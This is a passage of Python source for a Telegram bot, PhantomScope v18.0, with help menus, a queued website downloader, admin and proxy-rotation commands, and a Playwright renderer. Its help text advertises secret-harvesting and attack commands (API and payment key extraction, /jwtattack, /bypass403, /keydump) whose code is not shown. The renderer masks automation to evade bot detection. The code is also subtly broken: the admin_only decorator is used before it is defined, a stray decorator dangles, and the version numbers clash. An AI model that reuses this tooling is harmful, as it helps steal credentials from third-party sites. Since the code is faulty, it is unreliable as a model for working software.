        "  /setforcejoin `<channel>` — Force join"
    ),
    "help_all": (
        "📖 *Full Command List — PhantomScope v18.0*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📥 /download /fullsite /jsdownload /jsfullsite /resume /stop\n\n"
        "🔍 /vuln /api /tech /extract /antibot /jwtattack /sitekey /keydump\n\n"
        "🔑 /apikeys /firebase /paykeys /socialkeys /analytics\n"
        "    /hiddenkeys /pushkeys /endpoints /webhooks /oauthscan\n\n"
        "🕵️ /subdomains /bypass403 /fuzz /smartfuzz /monitor\n\n"
        "📱 /appassets — Upload APK/IPA/ZIP\n\n"
        "📊 /status /history /mystats\n\n"
        "💡 _/start → Category buttons နဲ့ details ကြည့်ပါ_"
    ),
}

_HELP_BACK_KB = InlineKeyboardMarkup([[
    InlineKeyboardButton("🏠 Menu သို့", callback_data="help_home")
]])


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid    = update.effective_user.id
    is_adm = uid in ADMIN_IDS
    js_st  = "✅ Ready" if PLAYWRIGHT_OK else "❌ pip install playwright"

    adm_row = [[InlineKeyboardButton("👑 Admin Panel", callback_data="help_admin")]] if is_adm else []
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📥 Download",      callback_data="help_download"),
            InlineKeyboardButton("🔍 Scan Tools",    callback_data="help_scan"),
        ],
        [
            InlineKeyboardButton("🔑 Key Extract",   callback_data="help_keys"),
            InlineKeyboardButton("🕵️ Recon",          callback_data="help_recon"),
        ],
        [
            InlineKeyboardButton("📱 App Analyzer",  callback_data="help_app"),
            InlineKeyboardButton("📊 My Account",    callback_data="help_account"),
        ],
        *adm_row,
        [InlineKeyboardButton("📖 Full List", callback_data="help_all")],
    ])

    await update.effective_message.reply_text(
        f"📖 *PhantomScope v18.0 — Help*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🖥️ JS Engine: `{js_st}`\n\n"
        f"Category ရွေးပါ ↓",
        parse_mode="Markdown",
        reply_markup=keyboard,
    )


async def help_category_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle help_* InlineKeyboard callbacks."""
    query = update.callback_query
    await query.answer()
    data  = query.data  # e.g. "help_download"
    uid   = query.from_user.id

    if data == "help_home":
        # Rebuild main menu
        js_badge = "✅ Ready" if PLAYWRIGHT_OK else "⚠️ Not installed"
        adm_row  = [[InlineKeyboardButton("👑 Admin Panel", callback_data="help_admin")]] if uid in ADMIN_IDS else []
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📥 Download",      callback_data="help_download"),
                InlineKeyboardButton("🔍 Scan Tools",    callback_data="help_scan"),
            ],
            [
                InlineKeyboardButton("🔑 Key Extract",   callback_data="help_keys"),
                InlineKeyboardButton("🕵️ Recon",          callback_data="help_recon"),
            ],
            [
                InlineKeyboardButton("📱 App Analyzer",  callback_data="help_app"),
                InlineKeyboardButton("📊 My Account",    callback_data="help_account"),
            ],
            *adm_row,
            [InlineKeyboardButton("📖 Full Command List", callback_data="help_all")],
        ])
        try:
            await query.edit_message_text(
                f"📖 *PhantomScope v18.0 — Help*\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🖥️ JS Engine: `{'✅ Ready' if PLAYWRIGHT_OK else '⚠️ Not installed'}`\n\n"
                f"Category ရွေးပါ ↓",
                parse_mode="Markdown",
                reply_markup=keyboard,
            )
        except Exception:
            pass
        return

    # Guard: admin-only section
    if data == "help_admin" and uid not in ADMIN_IDS:
        await query.answer("⛔ Admin only", show_alert=True)
        return

    text = _HELP_TEXTS.get(data)
    if not text:
        return

    try:
        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=_HELP_BACK_KB,
        )
    except Exception:
        pass


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, update.effective_user.id, update.effective_user.first_name)
        reset_daily(u)
        _save_db_sync(db)
    lim  = get_limit(db, u)
    used = u["count_today"]
    bar  = pbar(used, lim if lim > 0 else max(used, 1))
    await update.effective_message.reply_text(
        f"📊 *Status*\n\n👤 {u['name']}\n"
        f"🚫 Banned: {'Yes ❌' if u['banned'] else 'No ✅'}\n\n"
        f"📅 Today:\n`{bar}`\n"
        f"Used: `{used}` / `{'∞' if lim==0 else lim}`\n"
        f"📦 Total: `{u['total_downloads']}`",
        parse_mode='Markdown'
    )

async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, update.effective_user.id)
    dls = u.get("downloads",[])[-10:]
    if not dls:
        await update.effective_message.reply_text("📭 History မရှိသေးပါ"); return
    lines = ["📜 *Download History*\n"]
    for d in reversed(dls):
        icon = {"success":"✅","too_large":"⚠️"}.get(d["status"],"❌")
        lines.append(f"{icon} `{d['url'][:45]}`\n   {d['time']} | {d['size_mb']}MB")
    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')


# ── Core download runner ──────────────────────────

async def _run_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool,
    resume_mode: bool = False
):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name

    # ── Rate limit check ──────────────────────────
    if not resume_mode:
        allowed, wait_sec = check_rate_limit(uid)
        if not allowed:
            await update.effective_message.reply_text(
                f"⏱️ နည်းနည်းစောင့်ပါ — `{wait_sec}` seconds ကျန်သေးတယ်",
                parse_mode='Markdown'
            )
            return

    # ── SSRF pre-check ────────────────────────────
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(
            f"🚫 URL ကို download လုပ်ခွင့်မပြုပါ\n`{reason}`",
            parse_mode='Markdown'
        )
        return

    # ── DB checks (with lock) ─────────────────────
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, uid, uname)
        reset_daily(u)

        if u["banned"]:
            _save_db_sync(db)
            await update.effective_message.reply_text("🚫 Ban ထားပါတယ်"); return
        if not db["settings"]["bot_enabled"] and uid not in ADMIN_IDS:
            _save_db_sync(db)
            await update.effective_message.reply_text("🔴 Bot ယာယီပိတ်ထားပါတယ်"); return
        if not resume_mode and not can_download(db, u):
            lim = get_limit(db, u)
            _save_db_sync(db)
            await update.effective_message.reply_text(f"⛔ Daily limit ({lim}) ပြည့်ပါပြီ"); return
        _save_db_sync(db)

    mode_txt = ("🌐 Full" if full_site else "📄 Single") + (" ⚡JS" if use_js else "")
    msg = await update.effective_message.reply_text(
        f"⏳ *Download စနေပါတယ်{'(Resume)' if resume_mode else ''}...*\n"
        f"🔗 `{sanitize_log_url(url)}`\n📋 {mode_txt}\n\n"
        f"`{'░'*18}`  0%",
        parse_mode='Markdown'
    )

    last = {'t': ''}
    def sync_cb(text): last['t'] = text

    # ── Cancel flag — /stop command ───────────────
    cancel_event = asyncio.Event()
    _cancel_flags[uid] = cancel_event

    async def progress_loop():
        while True:
            await asyncio.sleep(2.5)
            if cancel_event.is_set():
                return
            if last['t']:
                try:
                    await msg.edit_text(
                        f"⏳ *Download နေဆဲ...*\n🔗 `{sanitize_log_url(url)}`\n\n{last['t']}",
                        parse_mode='Markdown'
                    )
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 1)
                except BadRequest:
                    pass

    prog = asyncio.create_task(progress_loop())

    async with download_semaphore:
        # Check cancel before starting heavy work
        if cancel_event.is_set():
            prog.cancel()
            _cancel_flags.pop(uid, None)
            await msg.edit_text("🛑 Download cancelled")
            return
        try:
            async with db_lock:
                db2 = _load_db_sync()
            mp = db2["settings"]["max_pages"]
            ma = db2["settings"]["max_assets"]
            files, error, stats, size_mb = await asyncio.to_thread(
                download_website, url, full_site, use_js, mp, ma, sync_cb, resume_mode
            )
        except Exception as e:
            prog.cancel()
            err_name = type(e).__name__
            err_hint = {
                "ConnectionError":  "🌐 ဆာဗာနဲ့ ချိတ်ဆက်မရပါ",
                "TimeoutError":     "⏱️ Response timeout ဖြစ်သွားတယ်",
                "SSLError":         "🔒 SSL certificate ပြဿနာ",
                "TooManyRedirects": "🔄 Redirect loop ဖြစ်နေတယ်",
            }.get(err_name, f"⚠️ {err_name}")
            await msg.edit_text(
                f"❌ *Download မအောင်မြင်ဘူး*\n\n"
                f"{err_hint}\n\n"
                f"▸ ဆက်လုပ်ဖို့: `/resume {url}`\n"
                f"▸ JS site ဆိုရင်: `/jsdownload {url}`",
                parse_mode='Markdown'
            )
            async with db_lock:
                db3 = _load_db_sync()
                u3  = get_user(db3, uid)
                log_download(u3, url, 0, "error")
                _save_db_sync(db3)
            _cancel_flags.pop(uid, None)
            return

    prog.cancel()
    _cancel_flags.pop(uid, None)   # download finished — remove flag

    # Check if cancelled during download
    if cancel_event.is_set():
        await msg.edit_text("🛑 Download ကို cancel လုပ်ပြီးပါပြီ")
        return

    if error:
        await msg.edit_text(f"❌ {error}"); return

    is_split = len(files) > 1
    await msg.edit_text(
        f"📤 Upload နေပါတယ်...\n💾 {size_mb:.1f} MB"
        + (f" → {len(files)} parts" if is_split else ""),
        parse_mode='Markdown'
    )

    try:
        for i, fpath in enumerate(files):
            part_label = f" (Part {i+1}/{len(files)})" if is_split else ""
            cap = (
                f"{'✅' if i==len(files)-1 else '📦'} *Done{part_label}*\n"
                f"🔗 `{sanitize_log_url(url)}`\n"
                f"📄 {stats['pages']}p | 📦 {stats['assets']}a | 💾 {size_mb:.1f}MB"
            )
            # ── RetryAfter-aware upload (3 attempts) ──────
            for attempt in range(3):
                try:
                    with open(fpath, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=update.effective_chat.id,
                            document=f, filename=os.path.basename(fpath),
                            caption=cap, parse_mode='Markdown'
                        )
                    break  # success
                except RetryAfter as e:
                    wait = e.retry_after + 2
                    logger.warning("Upload RetryAfter: waiting %ds", wait)
                    await asyncio.sleep(wait)
                except Exception:
                    if attempt == 2:
                        raise
                    await asyncio.sleep(3)

            os.remove(fpath)
            await asyncio.sleep(1)

        join_hint = (
            "\n\n*Combine လုပ်နည်း:*\n```\ncat *.part*.zip > full.zip\n```"
        ) if is_split else ""

        await msg.edit_text(f"✅ ပြီးပါပြီ 🎉{join_hint}", parse_mode='Markdown')

        async with db_lock:
            db4 = _load_db_sync()
            u4  = get_user(db4, uid)
            log_download(u4, url, size_mb, "success")
            _save_db_sync(db4)

    except RetryAfter as e:
        await msg.edit_text(f"❌ Telegram flood limit — `{e.retry_after}s` နောက်မှ ထပ်ကြိုးစားပါ")
    except Exception as e:
        await msg.edit_text(f"❌ Upload error: {type(e).__name__}")


# ── Command wrappers ──────────────────────────────

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/stop — Cancel current running download"""
    uid = update.effective_user.id
    event = _cancel_flags.get(uid)
    if event and not event.is_set():
        event.set()
        await update.effective_message.reply_text(
            "🛑 *Download cancel လုပ်နေပါတယ်...*\n"
            "⚙️ လက်ရှိ page/asset ပြီးရင် ရပ်မယ်",
            parse_mode='Markdown'
        )
    else:
        await update.effective_message.reply_text(
            "ℹ️ Cancel လုပ်စရာ Download မရှိပါ\n"
            "`/download`, `/fullsite` စသည်ဖြင့် download ကနဦးစပါ",
            parse_mode='Markdown'
        )


async def cmd_download(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/download <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, False, False)

async def cmd_fullsite(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/fullsite <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, True, False)

async def cmd_jsdownload(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/jsdownload <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, False, True)

async def cmd_jsfullsite(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/jsfullsite <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, True, True)

async def cmd_resume(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/resume <url>`", parse_mode='Markdown')
    url   = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    state = load_resume(url)
    if not state["visited"] and not state["downloaded"]:
        await u.message.reply_text("⚠️ Resume state မတွေ့ပါ — `/download` ကနေ အသစ်ကနေ စပါ", parse_mode='Markdown')
        return
    await u.message.reply_text(
        f"♻️ Resume: `{len(state['visited'])}` pages, `{len(state['downloaded'])}` assets done",
        parse_mode='Markdown'
    )
    await enqueue_download(u, c, url, True, False, resume_mode=True)


# ══════════════════════════════════════════════════
# 👑  ADMIN COMMANDS
# ══════════════════════════════════════════════════

async def _send_admin_panel(target, db: dict):
    bot_on    = db["settings"]["bot_enabled"]
    today     = str(date.today())
    tu        = len(db["users"])
    tdl       = sum(u.get("total_downloads",0) for u in db["users"].values())
    banned_n  = sum(1 for u in db["users"].values() if u.get("banned"))
    today_dl  = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
    kb = [
        [
            InlineKeyboardButton("👥 Users",   callback_data="adm_users"),
            InlineKeyboardButton("📊 Stats",   callback_data="adm_stats"),
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data="adm_settings"),
            InlineKeyboardButton(
                "🔴 Bot OFF" if bot_on else "🟢 Bot ON",
                callback_data="adm_toggle_bot"
            ),
        ],
        [InlineKeyboardButton("📜 Downloads Log", callback_data="adm_log")]
    ]
    text = (
        f"👑 *Admin Panel v17.0*\n\n"
        f"👥 Users: `{tu}` | 🚫 Banned: `{banned_n}`\n"
        f"📦 Total: `{tdl}` | Today: `{today_dl}`\n"
        f"Bot: {'🟢 ON' if bot_on else '🔴 OFF'}\n"
        f"⚡ Concurrent: `{MAX_WORKERS}` | Limit: `{db['settings']['global_daily_limit']}`\n"
        f"🔒 SSRF/Traversal/RateLimit: ✅\n"
        f"JS: {'✅' if PLAYWRIGHT_OK else '❌'}"
    )
    markup = InlineKeyboardMarkup(kb)
    try:
        if hasattr(target, 'edit_message_text'):
            await target.edit_message_text(text, reply_markup=markup, parse_mode='Markdown')
        else:
            await target.reply_text(text, reply_markup=markup, parse_mode='Markdown')
    except BadRequest: pass

@admin_only

# ══════════════════════════════════════════════════
# 🌐  PROXY ADMIN COMMANDS
# ══════════════════════════════════════════════════

@admin_only
async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy status and manage proxy list."""
    st = proxy_manager.stats()
    enabled_icon = "🟢" if st["enabled"] else "🔴"
    en = "ENABLED" if st["enabled"] else "DISABLED"
    text = (
        "🌐 *Proxy Manager*\n"
        "━"*20 + "\n"
        f"{enabled_icon} Status    : `{en}`\n"
        f"📋 Total     : `{st['total']}`\n"
        f"✅ Live      : `{st['live']}`\n"
        f"⏳ Cooldown  : `{st['in_cooldown']}`\n"
        f"🚀 Available : `{st['available']}`\n"
        f"🕐 Last Load : `{st['last_load']}`\n"
        f"📁 Source    : `{st['source'][:60]}`\n\n"
        "*Commands:*\n"
        "`/proxy reload` — Reload & recheck all proxies\n"
        "`/proxy add <proxy>` — Add single proxy\n"
        "`/proxy list` — List all proxies with status\n"
        "`/proxy test <url>` — Test current proxy against URL\n"
    )

    if context.args:
        sub = context.args[0].lower()

        if sub == "reload":
            await update.effective_message.reply_text("🔄 Reloading proxy list...", parse_mode='Markdown')
            await asyncio.to_thread(proxy_manager.reload)
            st2 = proxy_manager.stats()
            await update.effective_message.reply_text(
                "✅ *Proxy list reloaded*\n"
                f"Live: `{st2['live']}/{st2['total']}`",
                parse_mode='Markdown'
            )
            return

        elif sub == "add" and len(context.args) >= 2:
            proxy_url = context.args[1].strip()
            proxy_manager.add_proxy(proxy_url)
            await update.effective_message.reply_text(
                f"✅ Added proxy (health-checking in background):\n`{proxy_url}`",
                parse_mode='Markdown'
            )
            return

        elif sub == "list":
            proxies = proxy_manager.list_proxies()
            if not proxies:
                await update.effective_message.reply_text("📭 No proxies loaded.", parse_mode='Markdown')
                return
            lines_out = ["🌐 *Proxy List*\n" + "━"*14]
            for i, p in enumerate(proxies[:30], 1):
                icon = "✅" if p["alive"] and not p["cooldown"] else ("⏳" if p["cooldown"] else "❌")
                lines_out.append(f"{icon} `{p['proxy']}`")
            if len(proxies) > 30:
                lines_out.append(f"_...and {len(proxies)-30} more_")
            await update.effective_message.reply_text("\n".join(lines_out), parse_mode='Markdown')
            return

        elif sub == "test":
            test_url = context.args[1] if len(context.args) > 1 else "https://httpbin.org/ip"
            px = proxy_manager.get_proxy()
            if not px:
                await update.effective_message.reply_text("❌ No proxy available", parse_mode='Markdown')
                return
            proxy_url = px.get("http", "")
            try:
                resp = await asyncio.to_thread(
                    lambda: requests.get(test_url, proxies=px, timeout=10, verify=False)
                )
                await update.effective_message.reply_text(
                    "✅ *Proxy test passed*\n"
                    f"Proxy  : `{proxy_url}`\n"
                    f"URL    : `{test_url}`\n"
                    f"Status : `{resp.status_code}`\n"
                    f"Body   : `{resp.text[:100]}`",
                    parse_mode='Markdown'
                )
            except Exception as e:
                proxy_manager.mark_failed(px)
                await update.effective_message.reply_text(
                    "❌ *Proxy test failed*\n"
                    f"Proxy: `{proxy_url}`\n"
                    f"Error: `{e}`",
                    parse_mode='Markdown'
                )
            return

    await update.effective_message.reply_text(text, parse_mode='Markdown')


@admin_only
async def cmd_setproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set GitHub raw URL or direct URL as proxy source and reload."""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:*\n"
            "`/setproxy https://raw.githubusercontent.com/.../proxies.txt`\n\n"
            "Bot သည့သည် ဒီ URL ကနေသ proxy list ဆဲပြီး health-check လုပ်မည့",
            parse_mode='Markdown'
        )
        return
    new_url = context.args[0].strip()
    global PROXY_FILE_URL
    PROXY_FILE_URL = new_url
    await update.effective_message.reply_text(
        f"✅ Proxy source set to:\n`{new_url}`\n\nReloading...",
        parse_mode='Markdown'
    )
    await asyncio.to_thread(proxy_manager.reload)
    st = proxy_manager.stats()
    await update.effective_message.reply_text(
        f"✅ Loaded `{st['live']}/{st['total']}` live proxies",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 5 — Admin Auth Hardened
# ══════════════════════════════════════════════════

async def verify_admin(update: Update) -> bool:
    """
    Admin verification — multi-layer check
    """
    uid = update.effective_user.id

    # Layer 1: ID check
    if uid not in ADMIN_IDS:
        return False

    # Layer 2: Private chat only (admin commands in group = dangerous)
    if update.effective_chat.type != "private":
        await update.effective_message.reply_text(
            "⚠️ Admin commands ကို private chat မှာသာ သုံးနိုင်ပါတယ်"
        )
        return False

    # Layer 3: Not a forwarded message (anti-spoofing)
    # forward_origin = newer PTB | forward_date = older PTB version
    if update.message:
        is_forwarded = (
            getattr(update.message, 'forward_origin', None) or
            getattr(update.message, 'forward_date', None)
        )
        if is_forwarded:
            return False

    return True

def admin_only(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await verify_admin(update):
            # ── Admin command — user မြင်ရင်မကောင်းဘူး — silent ignore ──
            return
        return await func(update, context)
    return wrapper


# ══════════════════════════════════════════════════
# 🚨  ADMIN ERROR NOTIFY — Unhandled error → Admin DM
# ══════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler — Admin ဆီ Telegram message ပို့မည်"""
    import traceback
    tb = "".join(traceback.format_exception(
        type(context.error), context.error, context.error.__traceback__
    ))
    short_tb = tb[-1500:] if len(tb) > 1500 else tb   # Telegram 4096 char limit

    # User info (if available)
    user_info = ""
    if update and hasattr(update, "effective_user") and update.effective_user:
        u = update.effective_user
        user_info = f"\n👤 User: `{u.id}` ({u.first_name})"

    msg = (
        "🚨 *Bot Error Alert*\n"
        f"━━━━━━━━━━━━━━━━━━━━{user_info}\n\n"
        f"```\n{short_tb}\n```"
    )

    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=msg,
                parse_mode='Markdown'
            )
        except Exception:
            logger.warning("Admin error notify failed for %d", admin_id)

    logger.error("Unhandled exception: %s", context.error, exc_info=context.error)


# ══════════════════════════════════════════════════
# 🗑️  AUTO-DELETE — Expired download files cleaner
# ══════════════════════════════════════════════════

async def auto_delete_loop():
    """Background task — ၂၄ နာရီ (FILE_EXPIRY_HOURS) ကြာတဲ့ ZIP files auto-delete"""
    while True:
        try:
            now     = time.time()
            deleted = 0
            freed   = 0.0
            for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
                for root, dirs, files in os.walk(folder):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            age_hours = (now - os.path.getmtime(fpath)) / 3600
                            if age_hours >= FILE_EXPIRY_HOURS:
                                size = os.path.getsize(fpath) / 1024 / 1024
                                os.remove(fpath)
                                deleted += 1
                                freed   += size
                        except Exception:
                            pass
            if deleted:
                logger.info(
                    "Auto-delete: %d files | %.1f MB freed (>%dh old)",
                    deleted, freed, FILE_EXPIRY_HOURS
                )
        except Exception as e:
            logger.warning("Auto-delete loop error: %s", e)
        # ၁ နာရီတစ်ကြိမ် check
        await asyncio.sleep(3600)


# ══════════════════════════════════════════════════
# 📋  QUEUE SYSTEM — Download request queue
# ══════════════════════════════════════════════════

async def queue_worker():
    """Background worker — queue ထဲက download request တွေ တစ်ခုစီ run"""
    global _dl_queue
    while True:
        try:
            task = await _dl_queue.get()
            update, context, url, full_site, use_js, resume_mode, uid = task
            # Remove from position tracker
            _queue_pos.pop(uid, None)
            try:
                await _run_download(update, context, url, full_site, use_js, resume_mode)
            except Exception as e:
                logger.error("Queue worker download error: %s", e)
            finally:
                _dl_queue.task_done()
        except Exception as e:
            logger.error("Queue worker error: %s", e)
            await asyncio.sleep(1)


async def enqueue_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool, resume_mode: bool = False
):
    """Download request ကို queue ထဲ ထည့်သည်"""
    global _dl_queue
    uid = update.effective_user.id

    if _dl_queue.qsize() >= QUEUE_MAX:
        await update.effective_message.reply_text(
            f"⚠️ Queue ပြည့်နေပါတယ် (`{QUEUE_MAX}` max)\n"
            "ခဏနေပြီးမှ ထပ်ကြိုးစားပါ",
            parse_mode='Markdown'
        )
        return

    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid))
    pos = _dl_queue.qsize()
    _queue_pos[uid] = pos

    if pos > 1:
        await update.effective_message.reply_text(
            f"📋 *Queue ထဲ ထည့်ပြီးပါပြီ*\n"
            f"📍 Position: `{pos}`\n"
            f"⏳ Download ရောက်လာသည့်အခါ အလိုအလျောက် စမည်",
            parse_mode='Markdown'
        )


# ══════════════════════════════════════════════════
# 📦  DATABASE  (with async lock for race condition)
# ══════════════════════════════════════════════════

def _load_db_sync() -> dict:
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return {
        "users": {},
        "settings": {
            "global_daily_limit": DAILY_LIMIT,
            "max_pages": MAX_PAGES,
            "max_assets": MAX_ASSETS,
            "bot_enabled": True
        }
    }

def _save_db_sync(db: dict):
    # Atomic write — temp file → rename
    tmp = DB_FILE + ".tmp"
    with open(tmp, 'w', encoding='utf-8') as f:
        json.dump(db, f, ensure_ascii=False, indent=2)
    os.replace(tmp, DB_FILE)  # atomic on most OS

async def db_read() -> dict:
    """Thread-safe DB read (non-blocking)"""
    loop = asyncio.get_event_loop()
    async with db_lock:
        return await loop.run_in_executor(None, _load_db_sync)

async def db_write(db: dict):
    """Thread-safe DB write (non-blocking)"""
    loop = asyncio.get_event_loop()
    async with db_lock:
        await loop.run_in_executor(None, _save_db_sync, db)

async def db_update(func):
    """
    Thread-safe atomic DB update (non-blocking)
    Usage: await db_update(lambda db: db["users"][uid].update(...))
    """
    loop = asyncio.get_event_loop()
    async with db_lock:
        db = await loop.run_in_executor(None, _load_db_sync)
        func(db)
        await loop.run_in_executor(None, _save_db_sync, db)
        return db

def get_user(db: dict, user_id: int, name: str = "") -> dict:
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "name": name, "banned": False,
            "daily_limit": None, "count_today": 0,
            "last_date": "", "total_downloads": 0,
            "downloads": []
        }
    if name:
        db["users"][uid]["name"] = name
    return db["users"][uid]

def reset_daily(user: dict):
    today = str(date.today())
    if user["last_date"] != today:
        user["count_today"] = 0
        user["last_date"] = today

def get_limit(db: dict, user: dict) -> int:
    return user["daily_limit"] if user["daily_limit"] is not None \
           else db["settings"]["global_daily_limit"]

def can_download(db: dict, user: dict) -> bool:
    reset_daily(user)
    lim = get_limit(db, user)
    return lim == 0 or user["count_today"] < lim

def log_download(user: dict, url: str, size_mb: float, status: str):
    user["downloads"].append({
        "url": sanitize_log_url(url),       # ← sanitized before storing
        "time": datetime.now().strftime("%Y-%m-%d %H:%M"),
        "size_mb": round(size_mb, 2),
        "status": status
    })
    if len(user["downloads"]) > 100:
        user["downloads"] = user["downloads"][-100:]
    user["count_today"] += 1
    user["total_downloads"] += 1


# ══════════════════════════════════════════════════
# 💾  RESUME STATE  (with HMAC integrity)
# ══════════════════════════════════════════════════

def _state_sig(state: dict) -> str:
    data = json.dumps({k: v for k, v in state.items() if k != "_sig"}, sort_keys=True)
    return hmac.HMAC(SECRET_KEY.encode(), data.encode(), hashlib.sha256).hexdigest()

def _resume_path(url: str) -> str:
    return os.path.join(RESUME_DIR, hashlib.md5(url.encode()).hexdigest()[:12] + ".json")

def load_resume(url: str) -> dict:
    path = _resume_path(url)
    empty = {"visited": [], "downloaded": [], "assets": [], "stats": {}}
    if not os.path.exists(path):
        return empty
    try:
        with open(path) as f:
            state = json.load(f)
        sig = state.pop("_sig", "")
        if not hmac.compare_digest(_state_sig(state), sig):
            logger.warning("Resume state integrity check FAILED — ignoring")
            os.remove(path)
            return empty
        return state
    except Exception:
        return empty

def save_resume(url: str, state: dict):
    to_save = dict(state)
    to_save["_sig"] = _state_sig(state)
    tmp = _resume_path(url) + ".tmp"
    with open(tmp, 'w') as f:
        json.dump(to_save, f)
    os.replace(tmp, _resume_path(url))

def clear_resume(url: str):
    p = _resume_path(url)
    if os.path.exists(p):
        os.remove(p)


# ══════════════════════════════════════════════════
# 📊  PROGRESS BAR (Upgraded for Telegram)
# ══════════════════════════════════════════════════

def pbar(done: int, total: int, width: int = 18) -> str:
    """Telegram တွင် ပိုမိုသပ်ရပ်ချောမွေ့စွာ ပြသပေးမည့် Progress Bar"""
    if total <= 0:
        return "│" + " " * width + "│   0%"
    
    pct = min(max(done / total, 0.0), 1.0)
    fill_exact = pct * width
    full_blocks = int(fill_exact)
    remainder = fill_exact - full_blocks

    partials = [" ", "▏", "▎", "▍", "▌", "▋", "▊", "▉"]
    
    bar = "█" * full_blocks
    if full_blocks < width:
        bar += partials[int(remainder * len(partials))]
        bar += " " * (width - full_blocks - 1)

    pct_str = f"{int(pct * 100):>3}%"
    return f"│{bar}│ {pct_str}"

# ══════════════════════════════════════════════════
# 🌐  JS RENDERER  (Playwright — Python native)
# ══════════════════════════════════════════════════

def fetch_with_playwright(url: str) -> str | None:
    """
    Playwright ဖြင့် JS render လုပ်ပြီး HTML ထုတ်ပေးသည်။
    SECURITY: URL validate ပြီးမှသာ browser ဖွင့်သည်။
    """
    if not PLAYWRIGHT_OK:
        return None

    safe, reason = is_safe_url(url)
    if not safe:
        logger.warning(f"Playwright blocked unsafe URL: {reason}")
        return None

    if not re.match(r'^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+$', url):
        logger.warning("Playwright blocked URL with invalid characters")
        return None

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as pw:
            browser = pw.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-dev-shm-usage",
                      "--disable-blink-features=AutomationControlled", "--disable-gpu"]
            )
            ctx = browser.new_context(
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/122.0.0.0 Safari/537.36"
                ),
                viewport={"width": 1366, "height": 768},
                ignore_https_errors=True,
            )
            ctx.add_init_script(
                "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
                "window.chrome={runtime:{}};"
            )
            page = ctx.new_page()
            try:
                page.goto(url, wait_until="networkidle", timeout=40_000)
            except Exception:
                try:
                    page.goto(url, wait_until="load", timeout=25_000)
                except Exception:
                    pass
            html = page.content()
            browser.close()
            return html if html and html.strip() else None
    except Exception as e:
        logger.warning(f"Playwright exception: {type(e).__name__}: {e}")
        return None

def fetch_page(url: str, use_js: bool = False) -> tuple:
    """Returns: (html | None, js_used: bool)"""
    if use_js:
        html = fetch_with_playwright(url)
        if html:
            return html, True
        log_info(f"JS fallback to requests: {sanitize_log_url(url)}")

    try:
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        resp.raise_for_status()
        ct = resp.headers.get('Content-Type', '')
        if 'text/html' not in ct:
            return None, False
        return resp.text, False
    except Exception as e:
        log_warn(url, f"fetch error: {type(e).__name__}")
        return None, False


# ══════════════════════════════════════════════════
# 🔍  ASSET EXTRACTORS
# ══════════════════════════════════════════════════

def extract_assets(html: str, page_url: str) -> set:
    soup   = BeautifulSoup(html, 'html.parser')
    assets = set()

